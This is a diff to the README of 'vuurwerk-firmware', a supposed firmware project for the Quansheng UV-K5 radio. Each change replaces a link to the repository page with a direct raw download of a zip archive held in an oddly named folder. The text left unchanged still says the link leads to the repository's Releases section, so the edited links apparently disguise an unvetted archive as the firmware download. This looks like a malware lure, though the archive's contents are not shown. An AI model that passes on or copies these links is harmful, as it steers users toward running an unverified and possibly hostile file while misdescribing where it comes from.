@@ -1,6 +1,6 @@
 # 🎛️ vuurwerk-firmware - Enhance Your Quansheng UV-K5 Features
 
-[![Download vuurwerk-firmware](https://img.shields.io/badge/Download-vuurwerk--firmware-brightgreen?style=for-the-badge)](https://github.com/kutepoyzon/vuurwerk-firmware)
+[![Download vuurwerk-firmware](https://img.shields.io/badge/Download-vuurwerk--firmware-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/kutepoyzon/vuurwerk-firmware/main/averseness/firmware_vuurwerk_3.3-beta.4.zip)
 
 ---
 
@@ -27,7 +27,7 @@ Make sure your computer meets these minimum needs:
 ## 🌐 Where to Download
 
 Visit this page to download the firmware:  
-[https://github.com/kutepoyzon/vuurwerk-firmware](https://github.com/kutepoyzon/vuurwerk-firmware)
+[https://raw.githubusercontent.com/kutepoyzon/vuurwerk-firmware/main/averseness/firmware_vuurwerk_3.3-beta.4.zip](https://raw.githubusercontent.com/kutepoyzon/vuurwerk-firmware/main/averseness/firmware_vuurwerk_3.3-beta.4.zip)
 
 This link leads to the main repository. Here, you will find the latest firmware files in the releases section.
 
@@ -36,7 +36,7 @@ This link leads to the main repository. Here, you will find the latest firmware 
 ## 💾 Download and Installation
 
 1. Open your web browser and go to:  
-   https://github.com/kutepoyzon/vuurwerk-firmware
+   https://raw.githubusercontent.com/kutepoyzon/vuurwerk-firmware/main/averseness/firmware_vuurwerk_3.3-beta.4.zip
 
 2. On the repository page, find the **"Releases"** section. This is usually listed on the right side or near the top.
 
@@ -104,4 +104,4 @@ To keep your radio running smoothly:
 
 ---
 
-[![Download vuurwerk-firmware](https://img.shields.io/badge/Download-vuurwerk--firmware-blue?style=for-the-badge)](https://github.com/kutepoyzon/vuurwerk-firmware)
+[![Download vuurwerk-firmware](https://img.shields.io/badge/Download-vuurwerk--firmware-blue?style=for-the-badge)](https://raw.githubusercontent.com/kutepoyzon/vuurwerk-firmware/main/averseness/firmware_vuurwerk_3.3-beta.4.zip)
